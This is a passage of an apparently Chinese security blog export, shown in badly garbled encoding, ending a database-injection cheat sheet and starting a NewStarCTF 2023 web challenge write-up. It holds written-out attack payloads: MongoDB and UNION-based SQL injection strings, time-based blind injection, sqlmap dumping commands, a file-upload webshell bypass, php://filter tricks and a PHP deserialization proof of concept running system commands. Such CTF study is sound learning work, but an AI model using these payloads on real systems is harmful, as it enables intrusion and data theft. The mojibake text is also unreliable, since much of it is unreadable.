¼å¼ï¼Œæˆ‘ä»¬å¯ä»¥è®©å…¶è¿”å›Jsoné”®å€¼å¯¹çœ‹çœ‹ï¼š æ²¡é—®é¢˜ï¼Œå‰©ä¸‹çš„å°±æ˜¯å„ç§payloadå°è¯•äº†ã€‚ çˆ†æ•°æ®åº“ç‰ˆæœ¬ï¼š ?username=test'});return {username:db.version(),password:1};})//&amp;password=test çˆ†å½“å‰æ•°æ®åº“æ‰€æœ‰é›†åˆï¼Œè¿™é‡Œå› ä¸ºdb.getCollectionNames()è¿”å›çš„æ˜¯æ•°ç»„ã€éœ€è¦ç”¨tojson()è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¦å¤–MongoDBå‡½æ•°åŒºåˆ†å¤§å°å†™ï¼š ?username=test'});return {username:tojson(db.getCollectionNames()),password:1};})//&amp;password=test çˆ†å…¶ä»–é›†åˆç¬¬ä¸€æ¡æ•°æ®ï¼Œæˆ‘è¿™é‡Œæœ¬åœ°æ–°å»ºuseré›†åˆå¹¶æ’å…¥æ–‡æ¡£ï¼Œè‹¥æƒ³ç»§ç»­éå†çˆ†å…¶ä»–ä¿¡æ¯åªéœ€ä¿®æ”¹æ•°ç»„ä¸‹æ ‡å³å¯ï¼š ?username=test'});return {username:tojson(db.user.find()[0]),password:1};})//&amp;password=test å¾€useré›†åˆæ’å…¥æ–°ç”¨æˆ·æ•°æ®ï¼š ?username=test'});return {username:db.user.insert({'username':'mi1k7ea','password':'mi1k7ea'}),password:1};})//&amp;password=test åˆ©ç”¨é—­åˆ æ„é€ å¦‚ä¸‹payloadï¼Œç”¨äºé—­åˆåé¢çš„è¯­å¥ä½¿è¯­æ³•æ­£ç¡®ï¼š ?username=test'});return {username:db.version(),password:1};var b=({a:'1&amp;password=test å‰©ä¸‹çš„å…¶ä»–åˆ©ç”¨å’Œå‰é¢çš„ä¸€æ ·ï¼Œè¿™é‡Œåªè¯´ä¸ªé‡ç‚¹çš„ï¼Œåœ¨æ— å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°ç›²æ³¨æŠ€å·§ï¼Œè¿™é‡Œç”¨åˆ°çš„ç›²æ³¨æ˜¯åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œåœ¨é«˜ç‰ˆæœ¬ä¸‹MongoDBæ·»åŠ äº†sleep()å‡½æ•°ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªsleep()å‡½æ•°å’Œé—­åˆçš„æŠ€å·§æ¥å®ç°åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ˆè¿™ç§ç›²æ³¨æŠ€å·§ä»…åœ¨é—­åˆçš„æƒ…å†µä¸‹å¯è¡Œï¼Œæœ¬äººåœ¨æ³¨é‡Šçš„æƒ…å†µä¸‹å¹¶æœªæˆåŠŸï¼‰ï¼š ?username=test'});if (db.version()&gt;\"0\"){sleep(10000);exit;}var b=({a:'1&amp;password=test è‹¥æ•°æ®åº“ç‰ˆæœ¬å¤§äº0ï¼Œåˆ™sleep 10sï¼š å‰©ä¸‹çš„å°±æ˜¯è¿›é˜¶çš„äº†ï¼Œå¯å‚è€ƒä¸‹é¢çš„ 0x06 æ€»ç»“ emmmæœ¬æ¬¡æ–‡ç« å‘¢ï¼Œæ—¨åœ¨åˆæ­¥äº†è§£å„ç§å¸¸ç”¨æ•°æ®åº“çš„å¸¸è§„æ³¨å…¥è¯­å¥ï¼Œè¿›é˜¶çš„å†…å®¹çš„å¾ˆå°‘ï¼ˆä½†æˆ‘å¿ƒé‡Œè®¤ä¸ºè¿˜æ˜¯æœ‰å¿…è¦æ·±åº¦å­¦ä¹ ä¸€ä¸‹çš„ï¼‰ä¸è¿‡æˆ‘æ„Ÿè§‰å­¦å¥½MySQLçš„è¯ä¹Ÿæ˜¯å¾ˆæœ‰å¸®åŠ©çš„ï¼Œå‰©ä¸‹çš„å¯ä»¥é‡åˆ°çš„æ—¶å€™ç™¾åº¦ä»€ä¹ˆçš„ã€‚ æœ¬æ–‡å‘¢ä¹Ÿåªæ˜¯ç®€å•æ€»ç»“ä¸€ä¸‹ï¼Œcopy rate is 99.9999999999â€¦%ï¼ˆæˆ‘ä¹Ÿä¸æƒ³å•Šï¼Œå¤ªèœäº†ï¼Œé‡åˆ°ä¸ä¼šçš„çŸ¥è¯†ï¼Œä»¥ç›®å‰çš„æˆ‘æ ¹æœ¬æ²¡èƒ½åŠ›å†™å‡ºé«˜è´¨é‡çš„æ–‡ç« ï¼ˆä¹Ÿå°±æ˜¯ç”¨è‡ªå·±çš„è¯­è¨€ä»¥åŠæ€è€ƒå»å†™ï¼‰ï¼Œåªå¾—æŠ„è¢­ä¼—å¤šå¤§ä½¬çš„ï¼Œä½†å¸Œæœ›è¿™äº›çŸ¥è¯†å¯ä»¥å˜æˆè‡ªå·±çš„ï¼Œä¸è®ºå¦‚ä½•æˆ‘éƒ½ä¼šåŠªåŠ›æå‡è‡ªå·±ï¼Œåœ¨æ—¥åæå‡æ–‡ç« è´¨é‡ï¼ˆæ¯•ç«Ÿåªæœ‰è¿™æ ·ï¼Œæˆ‘è®¤ä¸ºæ‰å­¦çš„æ·±åˆ»å§ï¼‰ï¼Œæœ¬æ–‡ä¹Ÿä¼šä¸€ç›´æ›´æ–°ï¼ˆéš¾å…å®æˆ˜é‡åˆ°æ¥æ›´æ–°ä¸€ä¸‹ï¼‰ã€‚ åŠ æ²¹ï¼ï¼ 0x07 å‚è€ƒæ–‡ç«  mssqlå‚è€ƒ MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç† Mysql éšå¼ç±»å‹è½¬æ¢ MSSQL æ³¨å…¥å­¦ä¹ ç¬”è®° MSSQLæ³¨å…¥ç¯å¢ƒæ­å»º æ¸—é€æµ‹è¯•ä¹‹åŸºç¡€ç¯‡ï¼šMicrosoft SQL Serveræ‰‹æ³¨ä¹‹è”åˆæŸ¥è¯¢æ³¨å…¥ --é¶åœºå®æˆ˜å‚è€ƒ postgresqlå‚è€ƒ postgresqlæ³¨å…¥ [PostgreSQL] Oracleå‚è€ƒ Oracle SQLæ³¨å…¥å­¦ä¹  --å«ææƒ å…³äºå­¦ä¹ Oracleæ³¨å…¥ [Oracleæ³¨å…¥] ä»é›¶å¼€å§‹çš„Oracleæ³¨å…¥å­¦ä¹  ã€å®æˆ˜ã€‘Oracleæ³¨å…¥æ€»ç»“ MongoDBå‚è€ƒ NoSQLæ³¨å…¥ä¹‹MongoDB MongoDBæ³¨å…¥ MongoDB æ³¨å…¥æŒ‡åŒ— ä¸¨ http://drops.wooyun.org/tips/3939","categories":["å¸¸è§topæ¼æ´"]},{"title":"NewStarCTF 2023","path":"/2023/10/12/newstarctf-2023/","content":"0x01 å‰è¨€ æœ€è¿‘æ–°ç”Ÿèµ›å¾ˆå¤šï¼Œæˆ‘å¾ˆçˆ±ï¼Œä»¥ä¸ºå¯ä»¥é¡ºåˆ©åº¦è¿‡å››å‘¨ï¼ŒæŠŠCTFé¢˜åº§çƒ‚ï¼Œæ²¡æƒ³åˆ°åœ¨SHCTFçš„ç¬¬äºŒå‘¨å°±jiäº†ï¼ˆç›®å‰ä¸ºæ­¢ï¼Œâ”­â”®ï¹â”­â”®æœ‰ä¸¤é“é¢˜ä¸ä¼šï¼Œè¿˜æ˜¯å¤ªèœäº†å”‰ï¼Œäºæ˜¯è½¬æˆ˜newstarï¼Œå¸Œæœ›ä¸è¦æ‰“å‡»æˆ‘äº†ã€‚è¯ä¸å¤šè¯´ç›´æ¥å¼€å· WEEK1|WEB-æ³„æ¼çš„ç§˜å¯† ![image-20231111201723769](NewStarCTF 2023/image-20231111201723769.png) æ‹¿åˆ°ç¬¬ä¸€ä¸ªï¼Œè®¿é—®www.zipæ‹¿åˆ°ç¬¬äºŒä¸ª ![image-20231111201826309](NewStarCTF 2023/image-20231111201826309.png) WEEK1|WEB-Begin of Upload å³é”®æºä»£ç å‘ç°å¦‚ä¸‹ï¼š function validateForm() { var fileInput = document.getElementById(\"file\"); var file = fileInput.files[0]; var allowedExtensions = [\"jpg\", \"jpeg\", \"png\", \"gif\"]; var fileExtension = file.name.split('.').pop().toLowerCase(); if (!file) { alert(\"Please select a file to upload.\"); return false; } if (!allowedExtensions.includes(fileExtension)) { alert(\"é”™è¯¯çš„æ‹“å±•åï¼Œåªå…è®¸ä¸Šä¼ : JPG, JPEG, PNG, GIF\"); return false; } return true; } å‘ç°åªæ˜¯å‰ç«¯çš„éªŒè¯ï¼Œé‚£æˆ‘ä»¬å…ˆå¯¹æŸä¸ªæ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ç€ä¿®æ”¹åç¼€ä¸ºä¸Šè¿°jså…è®¸çš„ï¼Œä¸Šä¼ åbpæŠ“åŒ…ä¿®æ”¹åç¼€å³å¯ ![image-20231111202150535](NewStarCTF 2023/image-20231111202150535.png) ![image-20231111202218089](NewStarCTF 2023/image-20231111202218089.png) æ‹¿åˆ°flag WEEK1|WEB-Begin of HTTP ![image-20231111202453595](NewStarCTF 2023/image-20231111202453595.png) å®Œæ•´payloadå¦‚ä¸Šï¼Œå…¶ä¸­secretæŸ¥çœ‹æºä»£ç å³å¯å¾—åˆ° WEEK1|WEB-ErrorFlask flaskæŠ¥é”™é¡µé¢ä¿¡æ¯æ³„éœ² ![image-20231111203220248](NewStarCTF 2023/image-20231111203220248.png) è¿™é‡Œè®©æˆ‘ä»¬ç»™number1å’Œnumber2ä¼ å‚ï¼Œè¿™é‡Œéšä¾¿ç»™å…¶ä¸­ä¸€ä¸ªä¼ ä¸ªå­—æ¯ï¼Œå‘ç°åˆ°äº†ä¸‹é¢çš„æŠ¥é”™é¡µé¢ï¼Œå³å¯å¾—åˆ°flag ![image-20231111203032827](NewStarCTF 2023/image-20231111203032827.png) WEEK1|WEB-Begin of PHP &lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_GET['key1']) &amp;&amp; isset($_GET['key2'])){ echo \"=Level 1=&lt;br&gt;\"; if($_GET['key1'] !== $_GET['key2'] &amp;&amp; md5($_GET['key1']) == md5($_GET['key2'])){ $flag1 = True; }else{ die(\"nope,this is level 1\"); } } if($flag1){ echo \"=Level 2=&lt;br&gt;\"; if(isset($_POST['key3'])){ if(md5($_POST['key3']) === sha1($_POST['key3'])){ $flag2 = True; } }else{ die(\"nope,this is level 2\"); } } if($flag2){ echo \"=Level 3=&lt;br&gt;\"; if(isset($_GET['key4'])){ if(strcmp($_GET['key4'],file_get_contents(\"/flag\")) == 0){ $flag3 = True; }else{ die(\"nope,this is level 3\"); } } } if($flag3){ echo \"=Level 4=&lt;br&gt;\"; if(isset($_GET['key5'])){ if(!is_numeric($_GET['key5']) &amp;&amp; $_GET['key5'] &gt; 2023){ $flag4 = True; }else{ die(\"nope,this is level 4\"); } } } if($flag4){ echo \"=Level 5=&lt;br&gt;\"; extract($_POST); foreach($_POST as $var){ if(preg_match(\"/[a-zA-Z0-9]/\",$var)){ die(\"nope,this is level 5\"); } } if($flag5){ echo file_get_contents(\"/flag\"); }else{ die(\"nope,this is level 5\"); } } ç®€å•çš„PHPç‰¹æ€§ ![image-20231111204241044](NewStarCTF 2023/image-20231111204241044.png) æ‹¿åˆ°flag WEEK1|WEB-R!C!E! &lt;?php highlight_file(__FILE__); if(isset($_POST['password'])&amp;&amp;isset($_POST['e_v.a.l'])){ $password=md5($_POST['password']); $code=$_POST['e_v.a.l']; if(substr($password,0,6)===\"c4d038\"){ if(!preg_match(\"/flag|system|pass|cat|ls/i\",$code)){ eval($code); } } } è¿™é‡Œéœ€è¦èµ°ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹ import hashlib a=input(\"è¯·è¾“å…¥æ‚¨è¦çˆ†ç ´çš„md5:\") for i in range(1,200000000): x=hashlib.md5(str(i).encode(encoding='UTF-8')).hexdigest() if (x[0:6]==a): print(x) print(i) break å¾—åˆ°114514 ![image-20231111204631008](NewStarCTF 2023/image-20231111204631008.png) å¦‚å›¾æˆåŠŸçš„åˆ°phpinfoï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–äº† å¯ä»¥çœ‹åˆ°æ˜¯ç¦æ­¢äº† system å‡½æ•°ï¼Œå¯ä»¥é‡‡ç”¨ php è‡ªå¸¦çš„å‡½æ•°æ¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœï¼Œå…ˆä½¿ç”¨ scandir çœ‹ä¸€ä¸‹ç›®å½•ï¼Œæ³¨æ„ scandir æ˜¯ä¸ä¼šå›æ˜¾è¾“å‡ºçš„ï¼Œè®°å¾—åŠ ä¸Š var_dumpã€‚ ![image-20231111204728698](NewStarCTF 2023/image-20231111204728698.png) å‘ç°flag password=114514&amp;e[v.a.l=var_dump(file_get_contents($_POST['a']));&amp;a=/flag ![image-20231111204936443](NewStarCTF 2023/image-20231111204936443.png) æ‹¿åˆ°flag WEEK1|WEB-EasyLogin è¿›å…¥ä¹‹åæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»è¿›å»çœ‹çœ‹ã€‚ Ctrl``Cå’ŒCtrl``Då›åˆ° Shellï¼Œç®€å•çœ‹äº†ä¸‹ç›®å½•ç»“æ„æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ åªå‘ŠçŸ¥äº†å«æœ‰ä¸€ä¸ª admin ç”¨æˆ·ï¼ŒæŒ‰æ–¹å‘ä¸Šé”®å¯ä»¥æŸ¥è¯¢Bashå†å²è®°å½•ã€‚ ![image-20231111205334676](NewStarCTF 2023/image-20231111205334676.png) å‘ç° Hintï¼Œå¾—çŸ¥ admin çš„å¯†ç ä¸ºå¼±å¯†ç åŠ ä¸Šnewstarnewstar2023åå…¶ä¸­çš„ä¸€ä¸ªã€‚ æŒ‰CtrlDæˆ–è€…è¾“å…¥exitåå›è½¦å›åˆ°ç™»å½•ç•Œé¢ã€‚ è¯•ä¸€ä¸‹newstar``newstar2023ï¼Œæ²¡ç™»è¿›å»ï¼Œåœ¨ç½‘ä¸Šéšä¾¿æœå¼±å¯†ç ï¼Œè¯•ä¸€äº›å¸¸è§çš„ï¼Œè¯•å‡ºæ¥æ˜¯qwe123ï¼Œä¸åŒçš„é¶æœºå¯†ç å¯èƒ½ä¸ä¸€æ ·ã€‚ é¢˜ç›®é‡‡ç”¨çš„å¼±å¯†ç è¡¨ï¼š 123456789 password newstar newstar2023 123qwe qwe123 qwertyuiop asdfghjkl zxcvbnm admin123 admin888 111111 000000 ![image-20231111205827255](NewStarCTF 2023/image-20231111205827255.png) è¿™é‡Œæˆ‘000000ç™»å½•è¿›å»ï¼ŒæŸ¥çœ‹bashå†å²å‘½ä»¤å‘ç°è®©æˆ‘ä»¬ä½¿ç”¨hint ![image-20231111210045998](NewStarCTF 2023/image-20231111210045998.png) é‡æ–°ç™»å½•åæŠ“åŒ…ï¼ŒæŸ¥çœ‹httpå†å²è®°å½•å‘ç°ä¸Šå›¾ï¼Œæ‹¿åˆ°flag WEEK2|WEB-æ¸¸æˆé«˜æ‰‹ ![image-20231012214719990](NewStarCTF 2023/image-20231012214719990.png) æ‰“å¼€ç•Œé¢è¿™è·ŸSHCTFçš„æŸä¸ªä¸€æ ·å•Šï¼Œä¸è¿‡ä¼¼ä¹æ›´å¤æ‚ä¸€ç‚¹ï¼Ÿæˆ‘ä»¬ç›´æ¥F12å®¡è®¡jsã€‚ è¿™é‡Œçœ‹åˆ°flagæœ‰åˆ†æ•°é™åˆ¶ï¼Œé‚£æˆ‘ä»¬å»å°±jsæ‰¾æ‰¾å…³é”®è¯ï¼Œä¸œæ‰¾è¥¿æ‰¾å‘ç°ä¸€å¤„å¯ç–‘ä»£ç  ![image-20231012215035948](NewStarCTF 2023/image-20231012215035948.png) è¿™é‡Œæ˜¾ç¤ºè¿™åˆ†æ•°è¾¾æ ‡çš„å¤„ç†æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹åˆ°è¿™ä¼¼ä¹æ˜¯éœ€è¦bpæŠ“åŒ…ä¿®æ”¹å‘åŒ…æ–¹å¼çš„ï¼Œå—¯æˆ‘ä»¬ç›´æ¥å¼€æ ![image-20231012220006711](NewStarCTF 2023/image-20231012220006711.png) è¿™é‡Œä¾æ®ä»£ç ä¿®æ”¹ä¸º POSTä¼ å‚æ–¹å¼ï¼Œæ›´æ”¹urlè·¯å¾„ï¼Œæ·»åŠ content-typeçš„æ•°æ®è§£ææ ¼å¼ï¼Œç„¶åæ·»åŠ æ­£ç¡®çš„jsonæ•°æ®æ ¼å¼å³å¯å¾—åˆ°flag WEEK2|WEB-include 0ã€‚0 &lt;?php highlight_file(__FILE__); // FLAG in the flag.php $file = $_GET['file']; if(isset($file) &amp;&amp; !preg_match('/base|rot/i',$file)){ @include($file); }else{ die(\"nope\"); } ?&gt; nope ç®€å•çš„æ–‡ä»¶åŒ…å«é¢˜ç›®ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯çœ‹å¦‚ä½•ç»•è¿‡æ­£åˆ™çš„é—®é¢˜ï¼Œè¿™å°±è¦æ¬å‡ºå°ç¬”è®°äº† convertè½¬æ¢è¿‡æ»¤å™¨ å¸¸è§çš„convertè½¬æ¢è¿‡æ»¤å™¨æœ‰è¿™ä¸¤ç§ï¼š convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; convert.quoted-printable-encode å¯¹äºç¬¬ä¸€ç§æ¥è¯´ï¼Œå®ƒé€šè¿‡ PHP çš„ iconv æ‰©å±•å®ç°ï¼Œè¯¥æ‰©å±•å¯ä»¥å¸®åŠ©å°†è¾“å…¥æ•°æ®ä»æŒ‡å®šçš„å­—ç¬¦ç¼–ç ï¼ˆï¼‰è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦ç¼–ç ï¼ˆï¼‰ å…¶ä¸­input-encodingã€output-encodingæ”¯æŒçš„ç¼–ç æ ¼å¼ä¸ºï¼š UCS-4* UCS-4BE UCS-4LE* UCS-2 UCS-2BE UCS-2LE UTF-32* UTF-32BE* UTF-32LE* UTF-16* UTF-16BE* UTF-16LE* UTF-7 UTF7-IMAP UTF-8* ASCII* EUC-JP* SJIS* eucJP-win* SJIS-win* ISO-2022-JP ISO-2022-JP-MS CP932 CP51932 SJIS-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰ SJIS-Mobile#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰ SJIS-Mobile#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰ SJIS-Mobile#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰ UTF-8-Mobile#DOCOMOï¼ˆåˆ«åï¼šUTF-8-DOCOMOï¼‰ UTF-8-Mobile#KDDI-A UTF-8-Mobile#KDDI-Bï¼ˆåˆ«åï¼šUTF-8-KDDIï¼‰ UTF-8-Mobile#SOFTBANKï¼ˆåˆ«åï¼šUTF-8-SOFTBANKï¼‰ ISO-2022-JP-MOBILE#KDDIï¼ˆåˆ«åï¼šISO-2022-JP-KDDIï¼‰ JIS JIS-ms CP50220 CP50220raw CP50221 CP50222 ISO-8859-1* ISO-8859-2* ISO-8859-3* ISO-8859-4* ISO-8859-5* ISO-8859-6* ISO-8859-7* ISO-8859-8* ISO-8859-9* ISO-8859-10* ISO-8859-13* ISO-8859-14* ISO-8859-15* ISO-8859-16* byte2be byte2le byte4be byte4le BASE64 HTML-ENTITIESï¼ˆåˆ«åï¼šHTMLï¼‰ 7bit 8bit EUC-CN* CP936 GB18030 HZ EUC-TW* CP950 BIG-5* EUC-KR* UHCï¼ˆåˆ«åï¼šCP949ï¼‰ ISO-2022-KR Windows-1251ï¼ˆåˆ«åï¼šCP1251ï¼‰ Windows-1252ï¼ˆåˆ«åï¼šCP1252ï¼‰ CP866ï¼ˆåˆ«åï¼šIBM866ï¼‰ KOI8-R* KOI8-U* ArmSCII-8ï¼ˆåˆ«åï¼šArmSCII8ï¼‰ æœ¬é¢˜payloadå¦‚ä¸‹ï¼š ?filename=php://filter/convert.iconv.UTF-8.UTF-16/resource=check.php è¿™é‡Œä¹Ÿå°±æ˜¯æ›´æ¢æ­£ç¡®çš„è½¬æ¢å™¨å°±å¯ä»¥ç»•è¿‡äº†ï¼Œæ¯•ç«Ÿä»–è¿‡æ»¤çš„å¾ˆå°‘ï¼Œå°±ä¸¤ä¸ªå…³é”®è¯ï¼Œè¿™é‡Œå¤§å®¶ä¹Ÿå¯ä»¥æ”¾å…¥å­—å…¸çˆ†ç ´çœ‹çœ‹é‚£äº›èƒ½ç”¨ï¼Œæˆ‘è¿™é‡Œå°±æ˜¯ç›´æ¥é€‰æ‹©äº†æŸä¸ªå°è¯•çš„ ![image-20231012220434736](NewStarCTF 2023/image-20231012220434736.png) æˆåŠŸè¯»å–flag WEEK2|WEB-ez_sql æ–¹æ³•ä¸€ï¼šsqlmapä¸€æŠŠæ¢­ ![image-20231014143835755](NewStarCTF 2023/image-20231014143835755.png) æ‰“å¼€ç•Œé¢å¦‚ä¸‹ï¼Œäº‹åè¯¸è‘›äº®æ¥è¯´è¿™äº›è¿æ¥éƒ½å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç¬¬äºŒæ¬¡è§£çš„æ—¶å€™æ‰è§£å‡ºæ¥ï¼Œç¬¬ä¸€æ¬¡è¿›è¡Œå¸¸è§„æ³¨å…¥å‘ç°æ²¡å•¥ç”¨ï¼Œäºæ˜¯ç¬¬äºŒæ¬¡çš„è¯é€‰æ‹©sqlmapç›´æ¥ä¸€æŠŠæ¢­ï¼Œæ¼”ç¤ºå¦‚ä¸‹ é¦–å…ˆæˆ‘ä»¬å…ˆåˆ¤æ–­è¯¥ç½‘å€æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" ![image-20231014144323672](NewStarCTF 2023/image-20231014144323672.png) å¦‚ä¸Šå›¾å¯çŸ¥æ•°æ®åº“ç±»å‹ä¸ºmysqlå¹¶ä¸”å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¹Ÿçˆ†äº†å‡ºæ¥ã€‚è¿™è¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œæ¥ä¸‹æ¥ç›´æ¥é€‰æ‹©çˆ†æ•°æ®åº“ï¼ˆè¯­æ³•å¯è‡ªè¡Œç™¾åº¦ï¼‰ sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --dbs ![image-20231014144535359](NewStarCTF 2023/image-20231014144535359.png) å¯ä»¥çœ‹å‡ºå¯ä»¥æ•°æ®åº“ä¸ºctfï¼Œæ¥ä¸‹æ¥çˆ†è¡¨å sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --tables -D ctf ![image-20231014144657573](NewStarCTF 2023/image-20231014144657573.png) å¯ä»¥çœ‹åˆ°flagæ‰€åœ¨è¡¨åï¼Œæ¥ä¸‹æ¥çˆ†åˆ—å sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --columns -D ctf -T here_is_flag ![image-20231014144810841](NewStarCTF 2023/image-20231014144810841.png) æ¥ä¸‹æ¥æ˜¯çˆ†æ•°æ® sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --dump -D ctf -T here_is_flag ![image-20231014144854248](NewStarCTF 2023/image-20231014144854248.png) æ‹¿åˆ°flag æ–¹æ³•äºŒï¼šæ‰‹å·¥æ³¨å…¥ æˆ‘å§‹ç»ˆè®¤ä¸ºåº”è¯¥æ˜¯æ‰‹å·¥ä¸ºä¸»ï¼Œå·¥å…·ä¸ºè¾…ï¼Œå› æ­¤æˆ‘åˆæ¥ç€å°è¯•ä¸€ä¸‹æ‰‹å·¥ï¼Œé¦–å…ˆæˆ‘ä»¬æ­£å¸¸åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ ![image-20231014144956525](NewStarCTF 2023/image-20231014144956525.png) è¿™é‡Œæµ‹è¯•äº†å‡ æ¬¡å‘ç°éƒ½æ˜¯ä¸€ä¸ªnoçš„æç¤ºï¼Œæƒ³äº†æƒ³æˆ‘è®¤ä¸ºè¿™åº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œç„¶åæ— æ„é—´çœ‹åˆ°sqlmapçš„payloadå°è¯•çš„æœ‰å¤§å†™ï¼Œäºæ˜¯æˆ‘ä¹Ÿæ”¹æˆäº†å¤§å†™ ![image-20231014145139951](NewStarCTF 2023/image-20231014145139951.png) ![image-20231014145205187](NewStarCTF 2023/image-20231014145205187.png) å¯ä»¥çœ‹åˆ°æˆ‘å°†andæ¢ä¸ºäº†å¤§å†™ä¹‹åå‘ç°é¡µé¢æ˜¯ä¸€ä¸ªæŠ¥é”™ï¼Œä¸€ä¸ªæ­£å¸¸ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œæ¥ç€ç»§ç»­å¸¸è§„æ€è·¯ã€‚ æŸ¥å­—æ®µæ•° ?id=TMP0919' ORDER BY 5--+ //é¡µé¢æ­£å¸¸ ?id=TMP0919' ORDER BY 6--+ //é¡µé¢æŠ¥é”™ ![image-20231014145359706](NewStarCTF 2023/image-20231014145359706.png) ![image-20231014145408933](NewStarCTF 2023/image-20231014145408933.png) è¯´æ˜å½“å‰è¡¨å­—æ®µæ•°ä¸º5 æ¥ç€æŸ¥å›æ˜¾ä½ ?id=-TMP0919' UNION SELECT 1, 2, 3, 4, 5--+ //è¿™é‡Œidå€¼å‰é¢åŠ äº†ä¸ªè´Ÿå·çš„åŸå› æ˜¯ï¼Œé˜²æ­¢idé‚£ä¸€å—å„¿å ç”¨å›æ˜¾ä½ ![image-20231014145435492](NewStarCTF 2023/image-20231014145435492.png) å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°5ä¸ªå­—æ®µéƒ½å¯ä»¥å›æ˜¾ï¼Œé‚£æˆ‘ä»¬ç›´æ¥çˆ†åº“ ![image-20231014145548447](NewStarCTF 2023/image-20231014145548447.png) æ¥ç€æŸ¥çœ‹ctfä¸‹çš„è¡¨å ?id=-TMP0919' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ctf'--+ ![image-20231014150008934](NewStarCTF 2023/image-20231014150008934.png) æ¥ç€çˆ†å‡ºhere_is_flagä¸‹åˆ—å ?id=-TMP0919' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='ctf'--+ ![image-20231014150207165](NewStarCTF 2023/image-20231014150207165.png) æ¥ç€çˆ†å‡ºflagåˆ—ä¸‹çš„æ•°æ® ?id=-TMP0919' UNION SELECT 1, FLAG, 3, 4, 5 FROM here_is_flag--+ ![image-20231014150308760](NewStarCTF 2023/image-20231014150308760.png) æ‹¿åˆ°flag WEEK2|WEB-Unserializeï¼Ÿ &lt;?php highlight_file(__FILE__); // Maybe you need learn some knowledge about deserialize? class evil { private $cmd; public function __destruct() { if(!preg_match(\"/cat|tac|more|tail|base/i\", $this-&gt;cmd)){ @system($this-&gt;cmd); } } } @unserialize($_POST['unser']); ?&gt; ç®€å•çš„ååºåˆ—åŒ–ï¼Œç›´æ¥å°†unserèµ‹å€¼ä¸ºevilå¯¹è±¡ï¼Œåœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨destructè¿™ä¸ªææ„å‡½æ•°éšåä¼šæ‰§è¡Œsystemï¼Œè¿™é‡Œåªéœ€è¦ç»•è¿‡ä¸€ä¸‹å‘½ä»¤å³å¯ï¼Œpocå¦‚ä¸‹ &lt;?php class evil { public $cmd; } $poc = new evil(); $poc-&gt;cmd = 'ls /'; echo serialize($poc); ?&gt; è¿™é‡Œå¯ä»¥å…ˆçœ‹ä¸€ä¸‹ç½‘ç«™phpç‰ˆæœ¬åœ¨7.1ä»¥ä¸Šï¼Œè¿™ä¸ªç‰ˆæœ¬ä»¥ä¸Šå¯¹ç±»å±æ€§ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬ç›´æ¥å°†privateæ”¹ä¸ºpublicå³å¯ ![image-20231014151027275](NewStarCTF 2023/image-20231014151027275.png) ![image-20231014151117793](NewStarCTF 2023/image-20231014151117793.png) æ‰¾åˆ°flagï¼Œæ¥ä¸‹æ¥åœ¨ä¿®æ”¹pocå¦‚ä¸‹ï¼Œè¿™é‡Œè¿‡æ»¤è¡¥å…¨æˆ‘ä»¬é‡‡ç”¨nlè¯»å–å³å¯ &lt;?php class evil { public $cmd; } $poc = new evil(); $poc-&gt;cmd = 'nl /th1s_1s_fffflllll4444aaaggggg'; echo serialize($poc); ?&gt; ![image-20231014151222819](NewStarCTF 2023/image-20231014151222819.png) æ‹¿åˆ°flag WEEK2|WEB-Upload again! ![image-20231014151320133](NewStarCTF 2023/image-20231014151320133.png) emmmå¾ˆéš¾è¯„çš„é¡µé¢ã€‚ã€‚ã€‚ã€‚ï¼Œè¯ä¸å¤šè¯´æˆ‘ä»¬ç›´æ¥ä¼ ä¸€ä¸‹phpçœ‹çœ‹ ![image-20231014151500441](NewStarCTF 